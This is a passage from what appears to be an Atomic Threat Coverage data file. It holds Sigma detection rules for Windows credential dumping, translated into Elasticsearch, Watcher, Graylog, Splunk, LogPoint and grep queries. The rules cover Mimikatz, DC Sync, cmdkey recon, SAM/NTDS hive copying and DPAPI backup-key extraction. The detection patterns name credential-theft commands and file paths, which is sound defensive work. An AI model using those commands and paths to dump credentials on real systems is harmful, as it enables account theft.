mimikatz\\\\ * OR *\\\\ mimilib\\\\ * OR *\\\\ 3\\\\ eo.oe\\\\ * OR *\\\\ eo.oe.kiwi\\\\ * OR *\\\\ privilege\\\\:\\\\:debug\\\\ * OR *\\\\ sekurlsa\\\\:\\\\:logonpasswords\\\\ * OR *\\\\ lsadump\\\\:\\\\:sam\\\\ * OR *\\\\ mimidrv.sys\\\\ * OR *\\\\ p\\\\:\\\\:d\\\\ * OR *\\\\ s\\\\:\\\\:l\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-Use <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz Use\",\\n    \"description\": \"This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)\",\\n    \"tags\": [\\n      \"attack.s0002\",\\n      \"attack.t1003\",\\n      \"attack.lateral_movement\",\\n      \"attack.credential_access\",\\n      \"car.2013-07-001\",\\n      \"car.2019-04-004\"\\n    ],\\n    \"query\": \"Message.keyword:(*\\\\\\\\ mimikatz\\\\\\\\ * OR *\\\\\\\\ mimilib\\\\\\\\ * OR *\\\\\\\\ 3\\\\\\\\ eo.oe\\\\\\\\ * OR *\\\\\\\\ eo.oe.kiwi\\\\\\\\ * OR *\\\\\\\\ privilege\\\\\\\\:\\\\\\\\:debug\\\\\\\\ * OR *\\\\\\\\ sekurlsa\\\\\\\\:\\\\\\\\:logonpasswords\\\\\\\\ * OR *\\\\\\\\ lsadump\\\\\\\\:\\\\\\\\:sam\\\\\\\\ * OR *\\\\\\\\ mimidrv.sys\\\\\\\\ * OR *\\\\\\\\ p\\\\\\\\:\\\\\\\\:d\\\\\\\\ * OR *\\\\\\\\ s\\\\\\\\:\\\\\\\\:l\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Message.keyword:(*\\\\\\\\ mimikatz\\\\\\\\ * OR *\\\\\\\\ mimilib\\\\\\\\ * OR *\\\\\\\\ 3\\\\\\\\ eo.oe\\\\\\\\ * OR *\\\\\\\\ eo.oe.kiwi\\\\\\\\ * OR *\\\\\\\\ privilege\\\\\\\\:\\\\\\\\:debug\\\\\\\\ * OR *\\\\\\\\ sekurlsa\\\\\\\\:\\\\\\\\:logonpasswords\\\\\\\\ * OR *\\\\\\\\ lsadump\\\\\\\\:\\\\\\\\:sam\\\\\\\\ * OR *\\\\\\\\ mimidrv.sys\\\\\\\\ * OR *\\\\\\\\ p\\\\\\\\:\\\\\\\\:d\\\\\\\\ * OR *\\\\\\\\ s\\\\\\\\:\\\\\\\\:l\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz Use\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Message.keyword:(* mimikatz * * mimilib * * 3 eo.oe * * eo.oe.kiwi * * privilege\\\\:\\\\:debug * * sekurlsa\\\\:\\\\:logonpasswords * * lsadump\\\\:\\\\:sam * * mimidrv.sys * * p\\\\:\\\\:d * * s\\\\:\\\\:l *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Message=\"* mimikatz *\" OR Message=\"* mimilib *\" OR Message=\"* <3 eo.oe *\" OR Message=\"* eo.oe.kiwi *\" OR Message=\"* privilege::debug *\" OR Message=\"* sekurlsa::logonpasswords *\" OR Message=\"* lsadump::sam *\" OR Message=\"* mimidrv.sys *\" OR Message=\"* p::d *\" OR Message=\"* s::l *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Message IN [\"* mimikatz *\", \"* mimilib *\", \"* <3 eo.oe *\", \"* eo.oe.kiwi *\", \"* privilege::debug *\", \"* sekurlsa::logonpasswords *\", \"* lsadump::sam *\", \"* mimidrv.sys *\", \"* p::d *\", \"* s::l *\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* mimikatz .*|.*.* mimilib .*|.*.* <3 eo\\\\.oe .*|.*.* eo\\\\.oe\\\\.kiwi .*|.*.* privilege::debug .*|.*.* sekurlsa::logonpasswords .*|.*.* lsadump::sam .*|.*.* mimidrv\\\\.sys .*|.*.* p::d .*|.*.* s::l .*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Cmdkey Cached Credentials Recon\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: experimental\ndescription: Detects usage of cmdkey to look for cached credentials\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\nauthor: jmallette\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\cmdkey.exe'\n        CommandLine: '* /list *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks.\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Cmdkey Cached Credentials Recon\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: experimental\ndescription: Detects usage of cmdkey to look for cached credentials\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\nauthor: jmallette\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\cmdkey.exe'\n        CommandLine: '* /list *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks.\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\ \\\\/list\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Cmdkey-Cached-Credentials-Recon <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Cmdkey Cached Credentials Recon\",\\n    \"description\": \"Detects usage of cmdkey to look for cached credentials\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\/list\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\\\\\ \\\\\\\\/list\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Cmdkey Cached Credentials Recon\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n             User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\cmdkey.exe AND CommandLine.keyword:* \\\\/list *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\cmdkey.exe\" CommandLine=\"* /list *\") | table CommandLine,ParentCommandLine,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\cmdkey.exe\" CommandLine=\"* /list *\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\cmdkey\\\\.exe)(?=.*.* /list .*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Copying sensitive files with credential data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-07-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\esentutl.exe'\n          CommandLine|contains:\n            - 'vss'\n            - '/m'\n            - '/y'\n        - CommandLine|contains:\n            - '\\windows\\ntds\\ntds.dit'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system'\n            - '\\repair\\sam'\n            - '\\repair\\system'\n            - '\\repair\\security'\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\system'\n            - '\\config\\RegBack\\security'\n    condition: selection\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic invetigator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Copying sensitive files with credential data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-07-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\esentutl.exe'\n          CommandLine|contains:\n            - 'vss'\n            - '/m'\n            - '/y'\n        - CommandLine|contains:\n            - '\\windows\\ntds\\ntds.dit'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system'\n            - '\\repair\\sam'\n            - '\\repair\\system'\n            - '\\repair\\security'\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\system'\n            - '\\config\\RegBack\\security'\n    condition: selection\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic invetigator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\esentutl.exe AND CommandLine.keyword:(*vss* OR *\\\\/m* OR *\\\\/y*)) OR CommandLine.keyword:(*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit* OR *\\\\\\\\config\\\\\\\\sam* OR *\\\\\\\\config\\\\\\\\security* OR *\\\\\\\\config\\\\\\\\system* OR *\\\\\\\\repair\\\\\\\\sam* OR *\\\\\\\\repair\\\\\\\\system* OR *\\\\\\\\repair\\\\\\\\security* OR *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\sam* OR *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\system* OR *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\security*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Copying-sensitive-files-with-credential-data <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Copying sensitive files with credential data\",\\n    \"description\": \"Files with well-known filenames (sensitive files with credential data) copying\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"car.2013-07-001\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\esentutl.exe AND CommandLine.keyword:(*vss* OR *\\\\\\\\/m* OR *\\\\\\\\/y*)) OR CommandLine.keyword:(*\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\ntds\\\\\\\\\\\\\\\\ntds.dit* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\security* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\security* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\security*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\esentutl.exe AND CommandLine.keyword:(*vss* OR *\\\\\\\\/m* OR *\\\\\\\\/y*)) OR CommandLine.keyword:(*\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\ntds\\\\\\\\\\\\\\\\ntds.dit* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\security* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\security* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\system* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\RegBack\\\\\\\\\\\\\\\\security*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Copying sensitive files with credential data\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\esentutl.exe AND CommandLine.keyword:(*vss* *\\\\/m* *\\\\/y*)) OR CommandLine.keyword:(*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit* *\\\\\\\\config\\\\\\\\sam* *\\\\\\\\config\\\\\\\\security* *\\\\\\\\config\\\\\\\\system* *\\\\\\\\repair\\\\\\\\sam* *\\\\\\\\repair\\\\\\\\system* *\\\\\\\\repair\\\\\\\\security* *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\sam* *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\system* *\\\\\\\\config\\\\\\\\RegBack\\\\\\\\security*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\esentutl.exe\" (CommandLine=\"*vss*\" OR CommandLine=\"*/m*\" OR CommandLine=\"*/y*\")) OR (CommandLine=\"*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\sam*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\security*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\system*\" OR CommandLine=\"*\\\\\\\\repair\\\\\\\\sam*\" OR CommandLine=\"*\\\\\\\\repair\\\\\\\\system*\" OR CommandLine=\"*\\\\\\\\repair\\\\\\\\security*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\sam*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\system*\" OR CommandLine=\"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\security*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\esentutl.exe\" CommandLine IN [\"*vss*\", \"*/m*\", \"*/y*\"]) OR CommandLine IN [\"*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit*\", \"*\\\\\\\\config\\\\\\\\sam*\", \"*\\\\\\\\config\\\\\\\\security*\", \"*\\\\\\\\config\\\\\\\\system*\", \"*\\\\\\\\repair\\\\\\\\sam*\", \"*\\\\\\\\repair\\\\\\\\system*\", \"*\\\\\\\\repair\\\\\\\\security*\", \"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\sam*\", \"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\system*\", \"*\\\\\\\\config\\\\\\\\RegBack\\\\\\\\security*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\esentutl\\\\.exe)(?=.*(?:.*.*vss.*|.*.*/m.*|.*.*/y.*)))|.*(?:.*.*\\\\windows\\\\ntds\\\\ntds\\\\.dit.*|.*.*\\\\config\\\\sam.*|.*.*\\\\config\\\\security.*|.*.*\\\\config\\\\system.*|.*.*\\\\repair\\\\sam.*|.*.*\\\\repair\\\\system.*|.*.*\\\\repair\\\\security.*|.*.*\\\\config\\\\RegBack\\\\sam.*|.*.*\\\\config\\\\RegBack\\\\system.*|.*.*\\\\config\\\\RegBack\\\\security.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mimikatz DC Sync\nid: 611eab06-a145-4dfa-a295-3ccc5c20f59a\ndescription: Detects Mimikatz DC sync security events\nstatus: experimental\ndate: 2018/06/03\nmodified: 2019/10/08\nauthor: Benjamin Delpy, Florian Roth\nreferences:\n    - https://twitter.com/gentilkiwi/status/1003236624925413376\n    - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\ntags:\n    - attack.credential_access\n    - attack.s0002\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        Properties: \n            - '*Replicating Directory Changes All*'\n            - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*'\n    filter1:\n        SubjectDomainName: 'Window Manager'\n    filter2: \n        SubjectUserName:\n            - 'NT AUTHORITY*'\n            - '*$'\n    condition: selection and not filter1 and not filter2\nfalsepositives:\n    - Valid DC Sync that is not covered by the filters; please report\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz DC Sync\nid: 611eab06-a145-4dfa-a295-3ccc5c20f59a\ndescription: Detects Mimikatz DC sync security events\nstatus: experimental\ndate: 2018/06/03\nmodified: 2019/10/08\nauthor: Benjamin Delpy, Florian Roth\nreferences:\n    - https://twitter.com/gentilkiwi/status/1003236624925413376\n    - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\ntags:\n    - attack.credential_access\n    - attack.s0002\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        Properties: \n            - '*Replicating Directory Changes All*'\n            - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*'\n    filter1:\n        SubjectDomainName: 'Window Manager'\n    filter2: \n        SubjectUserName:\n            - 'NT AUTHORITY*'\n            - '*$'\n    condition: selection and not filter1 and not filter2\nfalsepositives:\n    - Valid DC Sync that is not covered by the filters; please report\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(((EventID:\"4662\" AND Properties.keyword:(*Replicating\\\\ Directory\\\\ Changes\\\\ All* OR *1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2*)) AND (NOT (SubjectDomainName:\"Window\\\\ Manager\"))) AND (NOT (SubjectUserName.keyword:(NT\\\\ AUTHORITY* OR *$))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-DC-Sync <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz DC Sync\",\\n    \"description\": \"Detects Mimikatz DC sync security events\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.s0002\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(((EventID:\\\\\"4662\\\\\" AND Properties.keyword:(*Replicating\\\\\\\\ Directory\\\\\\\\ Changes\\\\\\\\ All* OR *1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2*)) AND (NOT (SubjectDomainName:\\\\\"Window\\\\\\\\ Manager\\\\\"))) AND (NOT (SubjectUserName.keyword:(NT\\\\\\\\ AUTHORITY* OR *$))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(((EventID:\\\\\"4662\\\\\" AND Properties.keyword:(*Replicating\\\\\\\\ Directory\\\\\\\\ Changes\\\\\\\\ All* OR *1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2*)) AND (NOT (SubjectDomainName:\\\\\"Window\\\\\\\\ Manager\\\\\"))) AND (NOT (SubjectUserName.keyword:(NT\\\\\\\\ AUTHORITY* OR *$))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz DC Sync\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(((EventID:\"4662\" AND Properties.keyword:(*Replicating Directory Changes All* *1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2*)) AND (NOT (SubjectDomainName:\"Window Manager\"))) AND (NOT (SubjectUserName.keyword:(NT AUTHORITY* *$))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"4662\" (Properties=\"*Replicating Directory Changes All*\" OR Properties=\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\")) NOT (SubjectDomainName=\"Window Manager\")) NOT ((SubjectUserName=\"NT AUTHORITY*\" OR SubjectUserName=\"*$\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" ((event_id=\"4662\" Properties IN [\"*Replicating Directory Changes All*\", \"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\"])  -(SubjectDomainName=\"Window Manager\"))  -(SubjectUserName IN [\"NT AUTHORITY*\", \"*$\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*(?=.*4662)(?=.*(?:.*.*Replicating Directory Changes All.*|.*.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*))))(?=.*(?!.*(?:.*(?=.*Window Manager))))))(?=.*(?!.*(?:.*(?=.*(?:.*NT AUTHORITY.*|.*.*\\\\$))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1003 DPAPI Domain Backup Key Extraction\nid: 4ac1f50b-3bd0-4968-902d-868b4647937e\ndescription: Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers\nstatus: experimental\ndate: 2019/06/20\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4662\n        ObjectType: 'SecretObject'\n        AccessMask: '0x2'\n        ObjectName: 'BCKUPKEY'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1003 DPAPI Domain Backup Key Extraction\nid: 4ac1f50b-3bd0-4968-902d-868b4647937e\ndescription: Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers\nstatus: experimental\ndate: 2019/06/20\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4662\n        ObjectType: 'SecretObject'\n        AccessMask: '0x2'\n        ObjectName: 'BCKUPKEY'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4662\" AND ObjectType:\"SecretObject\" AND AccessMask:\"0x2\" AND ObjectName:\"BCKUPKEY\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1003-DPAPI-Domain-Backup-Key-Extraction <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1003 DPAPI Domain Backup Key Extraction\",\\n    \"description\": \"Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4662\\\\\" AND ObjectType:\\\\\"SecretObject\\\\\" AND 